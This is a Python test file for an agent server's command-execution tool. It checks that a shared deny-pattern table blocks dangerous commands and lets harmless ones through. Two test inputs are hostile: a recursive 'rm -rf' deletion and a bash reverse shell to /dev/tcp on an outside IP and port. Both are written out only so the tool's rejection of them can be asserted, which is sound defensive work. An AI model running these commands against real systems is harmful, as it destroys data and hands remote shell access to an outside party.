"""Task 17: command_exec._check_command_safety delegates to builtin_rules.

Verifies that command_exec's defense-in-depth blocklist now uses the shared
17-pattern COMMAND_DENY_PATTERNS table (single source of truth), including the
9 jiuwenswarm system-level deny patterns the old 8-pattern list lacked.
"""
import asyncio

from twinkle.agentserver.tools.builtin import command_exec


def test_dangerous_command_rejected_via_builtin_rules():
    out = asyncio.run(command_exec.command_exec.invoke({"command": "rm -rf /tmp/x"}))
    assert "rejected for safety" in out or "ERROR" in out


def test_jiuwen_reverse_shell_rejected():
    out = asyncio.run(command_exec.command_exec.invoke(
        {"command": "bash -i >& /dev/tcp/1.2.3.4/4444"}))
    assert "rejected" in out or "ERROR" in out


def test_benign_command_runs(monkeypatch, tmp_path):
    monkeypatch.setattr(
        "twinkle.agentserver.tools.builtin.command_exec.WORKSPACE_DIR", str(tmp_path))
    out = asyncio.run(command_exec.command_exec.invoke({"command": "echo hello"}))
    assert "hello" in out
